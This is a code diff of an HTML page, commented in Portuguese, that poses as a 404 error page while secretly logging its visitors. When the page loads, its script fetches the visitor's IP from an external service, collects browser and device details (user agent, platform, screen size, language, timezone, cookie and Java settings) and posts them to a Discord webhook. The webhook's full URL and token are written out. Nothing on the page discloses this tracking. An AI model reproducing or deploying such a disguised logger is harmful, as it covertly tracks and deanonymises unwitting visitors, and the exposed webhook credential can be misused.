@@ -41,6 +41,9 @@
         a:hover {
             text-decoration: underline;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -61,93 +64,83 @@
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const cookiesEnabled = navigator.cookieEnabled;
+            const javaEnabled = navigator.javaEnabled();
             
-            // Usando um serviço alternativo para IP (ipapi.co)
-            fetch('https://ipapi.co/json/')
+            // Tentativa de obter IP (usando um serviço externo)
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip || 'IP não disponível';
-                    const country = data.country_name || 'Desconhecido';
-                    const city = data.city || 'Desconhecida';
-                    
-                    sendToDiscord(
-                        ip,
-                        userAgent,
-                        platform,
-                        screenWidth,
-                        screenHeight,
-                        language,
-                        timezone,
-                        cookiesEnabled,
-                        country,
-                        city
-                    );
+                    const ip = data.ip;
+                    sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled);
                 })
                 .catch(error => {
                     console.error('Erro ao obter IP:', error);
-                    sendToDiscord(
-                        'IP não disponível',
-                        userAgent,
-                        platform,
-                        screenWidth,
-                        screenHeight,
-                        language,
-                        timezone,
-                        cookiesEnabled,
-                        'Desconhecido',
-                        'Desconhecida'
-                    );
+                    sendToDiscord('IP não disponível', userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled);
                 });
         }
 
         // Função para enviar dados para o Discord via webhook
-        function sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, country, city) {
+        function sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled) {
+            // SUBSTITUA ESTE URL PELO SEU WEBHOOK DO DISCORD
             const webhookURL = 'https://discord.com/api/webhooks/1391138971740016793/uEDSN4HVuuzsQYjeSeVIBfPXROy_n4rHJJ-m4Or1T1b4TLi7RjBXDsQI_KkyaEIgB_kQ';
             
-            const timestamp = new Date().toLocaleString('pt-BR');
+            const timestamp = new Date().toISOString();
             
             const embed = {
-                title: "⚠️ Alguém acessou a página de erro 404!",
+                title: "Novo acesso detectado",
                 color: 16711680, // Vermelho
                 fields: [
                     {
-                        name: "📌 IP",
+                        name: "IP",
                         value: ip,
                         inline: true
                     },
                     {
-                        name: "🌎 Localização",
-                        value: `${city}, ${country}`,
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ Dispositivo",
-                        value: `\`${platform}\` (${screenWidth}x${screenHeight})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔍 Navegador",
+                        name: "User Agent",
                         value: `\`\`\`${userAgent}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "⚙️ Configurações",
-                        value: `Idioma: \`${language}\`\nFuso Horário: \`${timezone}\`\nCookies: \`${cookiesEnabled ? 'Ativados' : 'Desativados'}\``,
-                        inline: false
+                        name: "Plataforma",
+                        value: platform,
+                        inline: true
                     },
                     {
-                        name: "⏰ Horário de Acesso",
+                        name: "Resolução",
+                        value: `${screenWidth}x${screenHeight}`,
+                        inline: true
+                    },
+                    {
+                        name: "Idioma",
+                        value: language,
+                        inline: true
+                    },
+                    {
+                        name: "Fuso Horário",
+                        value: timezone,
+                        inline: true
+                    },
+                    {
+                        name: "Cookies Habilitados",
+                        value: cookiesEnabled ? "Sim" : "Não",
+                        inline: true
+                    },
+                    {
+                        name: "Java Habilitado",
+                        value: javaEnabled ? "Sim" : "Não",
+                        inline: true
+                    },
+                    {
+                        name: "Timestamp",
                         value: timestamp,
                         inline: false
                     }
-                ],
-                footer: {
-                    text: "404 Logger - Dados coletados automaticamente"
-                }
+                ]
             };
             
             const payload = {
-                embeds: [embed]
+                embeds: [embed],
+                content: "⚠️ Alguém acessou a página de erro 404!"
             };
             
             fetch(webhookURL, {
@@ -156,7 +149,15 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(payload)
-            }).catch(error => console.error("Erro ao enviar para Discord:", error));
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Erro ao enviar para o Discord:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao enviar para o Discord:', error);
+            });
         }
 
         // Executa a coleta de dados quando a página carrega
